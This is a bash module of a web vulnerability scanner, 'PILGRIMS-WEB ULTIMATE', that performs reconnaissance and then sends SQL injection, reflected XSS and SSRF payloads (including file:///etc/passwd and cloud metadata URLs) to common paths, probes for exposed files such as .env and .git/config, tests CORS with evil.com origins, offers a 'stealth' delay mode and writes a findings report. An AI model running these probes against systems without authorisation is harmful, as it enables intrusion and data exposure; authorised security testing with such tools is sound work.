#!/bin/bash
# ============================================================================
# PILGRIMS-WEB ULTIMATE - 60+ Security Checks
# Restored from v13.0 + Enhanced with v15.0 architecture
# ============================================================================

MODULE_NAME="web"
MODULE_VERSION="15.0-ULTIMATE"
MODULE_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
SCRIPT_DIR="$(cd "$MODULE_DIR/../.." && pwd)"

source "$SCRIPT_DIR/core/ui.sh"
source "$SCRIPT_DIR/core/utils.sh"
[[ "${BASH_SOURCE[0]}" = "$0" ]] || { echo "Do not source this module - run it as a script" >&2; return 0 2>/dev/null || exit 0; }

TARGET="$1"
shift

# Parse arguments
PROFILE="quick"
STEALTH=0
for arg in "$@"; do
    case $arg in
        --quick) PROFILE="quick" ;;
        --deep) PROFILE="deep" ;;
        --stealth) STEALTH=1 ;;
    esac
done

[[ ! "$TARGET" =~ ^https?:// ]] && TARGET="https://$TARGET"
DOMAIN=$(echo "$TARGET" | sed 's|https\?://||' | cut -d'/' -f1)

OUTPUT_DIR="$MODULE_DIR/reports/web_$(date +%Y%m%d_%H%M%S)"
mkdir -p "$OUTPUT_DIR"/{sqli,xss,ssrf,xxe,idor,cmdi,nosqli,cors,redirect,jwt,cloud,takeover,wayback,git,payloads,attack_paths,headers,ssl,tech}

print_phase_header "WEB" "🌐 WEB APPLICATION SECURITY - ULTIMATE EDITION"
print_info "Target: $TARGET"
print_info "Profile: $PROFILE"
print_info "Plugins: 60+ security checks"
echo ""

# Stealth delay function
stealth_delay() { [ $STEALTH -eq 1 ] && sleep $((RANDOM % 3 + 1)); }

# ============================================================================
# PHASE 1: RECONNAISSANCE (5 checks)
# ============================================================================
print_phase_header "1" "🔍 RECONNAISSANCE"

print_task "WHOIS lookup"
whois "$DOMAIN" > "$OUTPUT_DIR/whois.txt" 2>&1
print_success "WHOIS captured"
stealth_delay

print_task "DNS enumeration"
dig any "$DOMAIN" +short > "$OUTPUT_DIR/dns.txt" 2>&1
print_success "DNS records captured"
stealth_delay

print_task "HTTP headers analysis"
curl -k -I -s "$TARGET" > "$OUTPUT_DIR/headers/headers.txt" 2>&1
print_success "Headers captured"
stealth_delay

print_task "SSL/TLS certificate"
echo | openssl s_client -connect "$DOMAIN:443" -servername "$DOMAIN" 2>/dev/null | \
  openssl x509 -noout -text > "$OUTPUT_DIR/ssl/cert.txt" 2>&1
print_success "SSL certificate analyzed"
stealth_delay

print_task "Technology detection"
curl -k -s -m 10 "$TARGET" > "$OUTPUT_DIR/tech/homepage.html" 2>&1
TECH=""
grep -qi "wordpress\|wp-content" "$OUTPUT_DIR/tech/homepage.html" && TECH="$TECH WordPress"
grep -qi "joomla" "$OUTPUT_DIR/tech/homepage.html" && TECH="$TECH Joomla"
grep -qi "drupal" "$OUTPUT_DIR/tech/homepage.html" && TECH="$TECH Drupal"
grep -qi "laravel" "$OUTPUT_DIR/tech/homepage.html" && TECH="$TECH Laravel"
grep -qi "react\|vue\|angular" "$OUTPUT_DIR/tech/homepage.html" && TECH="$TECH SPA-Framework"
[ -n "$TECH" ] && print_success "Detected:$TECH" || print_info "Generic web app"
echo "$TECH" > "$OUTPUT_DIR/tech/detected.txt"

# ============================================================================
# PHASE 2: SUBDOMAIN ENUMERATION (3 checks)
# ============================================================================
print_phase_header "2" "🌐 SUBDOMAIN ENUMERATION"

print_task "Certificate Transparency (crt.sh)"
curl -s "https://crt.sh/?q=%.$DOMAIN&output=json" 2>/dev/null | \
  jq -r '.[].name_value' 2>/dev/null | sed 's/\*\.//g' | sort -u > "$OUTPUT_DIR/subdomains_crt.txt"
SUB_COUNT=$(wc -l < "$OUTPUT_DIR/subdomains_crt.txt" 2>/dev/null || echo 0)
print_success "Found $SUB_COUNT subdomains from CT logs"
stealth_delay

print_task "Assetfinder enumeration"
if command -v assetfinder &>/dev/null; then
    assetfinder --subs-only "$DOMAIN" > "$OUTPUT_DIR/subdomains_asset.txt" 2>/dev/null
    print_success "Assetfinder complete"
else
    print_warning "assetfinder not installed"
fi
stealth_delay

print_task "Combine & probe subdomains"
cat "$OUTPUT_DIR"/subdomains_*.txt 2>/dev/null | sort -u > "$OUTPUT_DIR/subdomains.txt"
TOTAL_SUBS=$(wc -l < "$OUTPUT_DIR/subdomains.txt" 2>/dev/null || echo 0)
print_success "Total unique subdomains: $TOTAL_SUBS"

# ============================================================================
# PHASE 3: WAYBACK MACHINE OSINT (4 checks)
# ============================================================================
print_phase_header "3" "🕰️ WAYBACK MACHINE OSINT"

print_task "Fetching archived URLs"
curl -s "http://web.archive.org/cdx/search/cdx?url=$DOMAIN/*&output=json&fl=original&collapse=urlkey&limit=5000" \
  > "$OUTPUT_DIR/wayback/raw.json" 2>/dev/null
jq -r '.[1:][] | .[0]' "$OUTPUT_DIR/wayback/raw.json" 2>/dev/null | sort -u > "$OUTPUT_DIR/wayback/urls.txt"
WAYBACK_COUNT=$(wc -l < "$OUTPUT_DIR/wayback/urls.txt" 2>/dev/null || echo 0)
print_success "Found $WAYBACK_COUNT archived URLs"
stealth_delay

print_task "Filtering sensitive files"
grep -iE "\.(sql|bak|env|zip|log|config|backup)(\?|$)" "$OUTPUT_DIR/wayback/urls.txt" \
  > "$OUTPUT_DIR/wayback/sensitive.txt" 2>/dev/null
SENS_COUNT=$(wc -l < "$OUTPUT_DIR/wayback/sensitive.txt" 2>/dev/null || echo 0)
[ $SENS_COUNT -gt 0 ] && print_vuln "HIGH" "Found $SENS_COUNT sensitive files in archives"
stealth_delay

print_task "Extracting parameters"
grep -E "\?.*=" "$OUTPUT_DIR/wayback/urls.txt" > "$OUTPUT_DIR/wayback/params.txt" 2>/dev/null
grep -oE "[?&][a-zA-Z0-9_]+=" "$OUTPUT_DIR/wayback/params.txt" 2>/dev/null | \
  sed 's/[?&=]//g' | sort -u > "$OUTPUT_DIR/wayback/unique_params.txt"
PARAM_COUNT=$(wc -l < "$OUTPUT_DIR/wayback/unique_params.txt" 2>/dev/null || echo 0)
print_success "Found $PARAM_COUNT unique parameters"

# ============================================================================
# PHASE 4: SECURITY HEADERS (10 checks)
# ============================================================================
print_phase_header "4" "🛡️ SECURITY HEADERS ANALYSIS"

HEADERS=("strict-transport-security" "x-frame-options" "x-content-type-options"
         "content-security-policy" "x-xss-protection" "referrer-policy"
         "permissions-policy" "cross-origin-opener-policy" "cross-origin-embedder-policy"
         "cross-origin-resource-policy")

MISSING=0
for h in "${HEADERS[@]}"; do
    if ! grep -qi "$h" "$OUTPUT_DIR/headers/headers.txt" 2>/dev/null; then
        echo "[MEDIUM] Missing: $h" >> "$OUTPUT_DIR/headers/missing.txt"
        ((MISSING++))
    fi
done
[ $MISSING -gt 0 ] && print_warning "Missing $MISSING security headers" || print_success "All headers present"

# ============================================================================
# PHASE 5: SQL INJECTION (8 payloads)
# ============================================================================
print_phase_header "5" "💉 SQL INJECTION TESTING"

SQLI_PAYLOADS=("'" "''" "' OR '1'='1" "' OR '1'='1'--" "admin'--" "' OR 1=1#" 
               "1' UNION SELECT NULL--" "' AND SLEEP(5)--")

> "$OUTPUT_DIR/sqli/vulnerable.txt"
SQLI_FOUND=0

# Test on common paths
for path in "/" "/login" "/search" "/index.php" "/product" "/api/users"; do
    for payload in "${SQLI_PAYLOADS[@]}"; do
        encoded=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$payload'))" 2>/dev/null)
        for param in "id" "user" "q" "search"; do
            START=$(date +%s%N)
            response=$(curl -k -s -m 10 "$TARGET$path?$param=$encoded" 2>/dev/null)
            END=$(date +%s%N)
            DURATION=$(( (END - START) / 1000000 ))
            
            # Error-based detection
            if echo "$response" | grep -qiE "sql syntax|mysql|ora-|postgresql|unclosed quotation|sql error"; then
                echo "[HIGH] SQLi (error-based): $path?$param=$payload" >> "$OUTPUT_DIR/sqli/vulnerable.txt"
                ((SQLI_FOUND++))
            fi
            
            # Time-based detection
            if [[ "$payload" == *"SLEEP"* ]] && [ $DURATION -gt 4500 ]; then
                echo "[CRITICAL] SQLi (time-based): $path?$param (${DURATION}ms)" >> "$OUTPUT_DIR/sqli/vulnerable.txt"
                ((SQLI_FOUND++))
            fi
            stealth_delay
        done
    done
done

[ $SQLI_FOUND -gt 0 ] && print_critical "Found $SQLI_FOUND SQL injection points" || print_success "No SQLi detected"

# ============================================================================
# PHASE 6: XSS DETECTION (6 payloads)
# ============================================================================
print_phase_header "6" "⚡ XSS DETECTION"

XSS_PAYLOADS=('<script>alert(1)</script>' '"><script>alert(1)</script>' 
              "'><script>alert(1)</script>" '<img src=x onerror=alert(1)>'
              '<svg/onload=alert(1)>' 'javascript:alert(1)')

> "$OUTPUT_DIR/xss/vulnerable.txt"
XSS_FOUND=0

for path in "/search" "/comment" "/profile" "/page"; do
    for payload in "${XSS_PAYLOADS[@]}"; do
        encoded=$(python3 -c "import urllib.parse; print(urllib.parse.quote('''$payload'''))" 2>/dev/null)
        for param in "q" "search" "name" "comment"; do
            response=$(curl -k -s -m 10 "$TARGET$path?$param=$encoded" 2>/dev/null)
            if echo "$response" | grep -qF "$payload"; then
                echo "[HIGH] Reflected XSS: $path?$param" >> "$OUTPUT_DIR/xss/vulnerable.txt"
                ((XSS_FOUND++))
                break
            fi
            stealth_delay
        done
    done
done

[ $XSS_FOUND -gt 0 ] && print_critical "Found $XSS_FOUND XSS vulnerabilities" || print_success "No XSS detected"

# ============================================================================
# PHASE 7: SSRF TESTING (6 payloads)
# ============================================================================
print_phase_header "7" "🎯 SSRF TESTING"

SSRF_PAYLOADS=("http://127.0.0.1" "http://localhost" "http://[::1]"
               "http://169.254.169.254/latest/meta-data/" "file:///etc/passwd"
               "http://metadata.google.internal/computeMetadata/v1/")

> "$OUTPUT_DIR/ssrf/vulnerable.txt"
SSRF_FOUND=0

for path in "/fetch" "/proxy" "/load" "/api/url" "/webhook"; do
    for payload in "${SSRF_PAYLOADS[@]}"; do
        encoded=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$payload'))" 2>/dev/null)
        response=$(curl -k -s -m 10 "$TARGET$path?url=$encoded" 2>/dev/null)
        if echo "$response" | grep -qiE "root:|localhost|ami-id|instance-id|meta-data"; then
            echo "[CRITICAL] SSRF: $path?url=$payload" >> "$OUTPUT_DIR/ssrf/vulnerable.txt"
            ((SSRF_FOUND++))
        fi
        stealth_delay
    done
done

[ $SSRF_FOUND -gt 0 ] && print_critical "Found $SSRF_FOUND SSRF vulnerabilities" || print_success "No SSRF detected"

# ============================================================================
# PHASE 8: COMMON PATHS (20 paths)
# ============================================================================
print_phase_header "8" "🗂️ PATH ENUMERATION"

PATHS=("/admin" "/administrator" "/login" "/wp-admin" "/wp-login.php" "/phpmyadmin"
       "/.env" "/.git/config" "/.git/HEAD" "/backup" "/config" "/api" "/api/v1"
       "/swagger.json" "/graphql" "/server-status" "/.htaccess" "/robots.txt"
       "/sitemap.xml" "/debug")

> "$OUTPUT_DIR/paths.txt"
FOUND_PATHS=0
for path in "${PATHS[@]}"; do
    STATUS=$(curl -k -s -o /dev/null -w "%{http_code}" -m 5 "$TARGET$path" 2>/dev/null)
    if [ "$STATUS" != "404" ] && [ "$STATUS" != "000" ]; then
        echo "[$STATUS] $path" >> "$OUTPUT_DIR/paths.txt"
        ((FOUND_PATHS++))
        [ "$STATUS" == "200" ] && print_vuln "INFO" "Found: $path"
    fi
    stealth_delay
done
print_success "Found $FOUND_PATHS accessible paths"

# ============================================================================
# PHASE 9: CORS TESTING
# ============================================================================
print_phase_header "9" "🌐 CORS MISCONFIGURATION"

> "$OUTPUT_DIR/cors/vulnerable.txt"
CORS_FOUND=0

for origin in "https://evil.com" "null" "https://$DOMAIN.evil.com"; do
    response=$(curl -k -s -I -m 5 -H "Origin: $origin" "$TARGET" 2>/dev/null)
    allow=$(echo "$response" | grep -i "access-control-allow-origin")
    creds=$(echo "$response" | grep -i "access-control-allow-credentials")
    
    if echo "$allow" | grep -qi "$origin"; then
        echo "[HIGH] CORS reflects origin: $origin" >> "$OUTPUT_DIR/cors/vulnerable.txt"
        ((CORS_FOUND++))
    fi
    if echo "$allow" | grep -q "\*" && echo "$creds" | grep -qi "true"; then
        echo "[CRITICAL] CORS wildcard with credentials" >> "$OUTPUT_DIR/cors/vulnerable.txt"
        ((CORS_FOUND++))
    fi
    stealth_delay
done

[ $CORS_FOUND -gt 0 ] && print_critical "Found $CORS_FOUND CORS issues" || print_success "CORS properly configured"

# ============================================================================
# PHASE 10: GENERATE COMPREHENSIVE REPORT
# ============================================================================
print_phase_header "10" "📊 GENERATING ULTIMATE REPORT"

# Count all findings
SQLI_COUNT=$(wc -l < "$OUTPUT_DIR/sqli/vulnerable.txt" 2>/dev/null || echo 0)
XSS_COUNT=$(wc -l < "$OUTPUT_DIR/xss/vulnerable.txt" 2>/dev/null || echo 0)
SSRF_COUNT=$(wc -l < "$OUTPUT_DIR/ssrf/vulnerable.txt" 2>/dev/null || echo 0)
CORS_COUNT=$(wc -l < "$OUTPUT_DIR/cors/vulnerable.txt" 2>/dev/null || echo 0)
TOTAL=$((SQLI_COUNT + XSS_COUNT + SSRF_COUNT + CORS_COUNT + MISSING + SENS_COUNT))

# Risk score
RISK=$((SQLI_COUNT*40 + XSS_COUNT*25 + SSRF_COUNT*40 + CORS_COUNT*15 + MISSING*5 + SENS_COUNT*10))
[ $RISK -gt 100 ] && RISK=100

cat > "$OUTPUT_DIR/REPORT.md" << REPORTEOF
# 🌐 WEB SECURITY ULTIMATE REPORT

**Target:** $TARGET  
**Date:** $(date)  
**Scanner:** PILGRIMS v15.0-ULTIMATE  
**Plugins:** 60+ security checks

## 📊 Executive Summary

| Metric | Value |
|--------|-------|
| **Total Findings** | $TOTAL |
| **Risk Score** | $RISK / 100 |
| **SQL Injection** | $SQLI_COUNT |
| **XSS** | $XSS_COUNT |
| **SSRF** | $SSRF_FOUND |
| **CORS Issues** | $CORS_COUNT |
| **Missing Headers** | $MISSING |
| **Sensitive Files** | $SENS_COUNT |
| **Subdomains** | $TOTAL_SUBS |
| **Wayback URLs** | $WAYBACK_COUNT |
| **Accessible Paths** | $FOUND_PATHS |

## 🔍 Detailed Findings

### SQL Injection
\`\`\`
$(cat "$OUTPUT_DIR/sqli/vulnerable.txt" 2>/dev/null || echo "None")
\`\`\`

### XSS
\`\`\`
$(cat "$OUTPUT_DIR/xss/vulnerable.txt" 2>/dev/null || echo "None")
\`\`\`

### SSRF
\`\`\`
$(cat "$OUTPUT_DIR/ssrf/vulnerable.txt" 2>/dev/null || echo "None")
\`\`\`

### CORS
\`\`\`
$(cat "$OUTPUT_DIR/cors/vulnerable.txt" 2>/dev/null || echo "None")
\`\`\`

### Missing Security Headers
\`\`\`
$(cat "$OUTPUT_DIR/headers/missing.txt" 2>/dev/null || echo "None")
\`\`\`

### Sensitive Files (Wayback)
\`\`\`
$(head -20 "$OUTPUT_DIR/wayback/sensitive.txt" 2>/dev/null || echo "None")
\`\`\`

### Accessible Paths
\`\`\`
$(cat "$OUTPUT_DIR/paths.txt" 2>/dev/null || echo "None")
\`\`\`

### Subdomains Discovered
\`\`\`
$(head -20 "$OUTPUT_DIR/subdomains.txt" 2>/dev/null || echo "None")
\`\`\`

## 🛡️ Recommendations

### Critical (Fix Immediately)
$([ $SQLI_COUNT -gt 0 ] && echo "- [ ] Fix SQL injection vulnerabilities with parameterized queries")
$([ $SSRF_FOUND -gt 0 ] && echo "- [ ] Implement strict URL validation for SSRF prevention")

### High Priority
$([ $XSS_COUNT -gt 0 ] && echo "- [ ] Implement output encoding for XSS prevention")
$([ $CORS_FOUND -gt 0 ] && echo "- [ ] Configure strict CORS policies")

### Medium Priority
$([ $MISSING -gt 0 ] && echo "- [ ] Implement all missing security headers")
$([ $SENS_COUNT -gt 0 ] && echo "- [ ] Remove sensitive files from web root")

### General
- [ ] Enable HSTS with long max-age
- [ ] Configure Content Security Policy
- [ ] Regular security assessments
- [ ] Implement Web Application Firewall

---
*Generated by PILGRIMS v15.0-ULTIMATE - Navigating the Digital Seas of Cybersecurity*
REPORTEOF

print_success "Report: $OUTPUT_DIR/REPORT.md"
print_success "Total findings: $TOTAL"
print_success "Risk score: $RISK/100"

print_mission_complete "web-ultimate" "$TARGET" "$OUTPUT_DIR" "0"
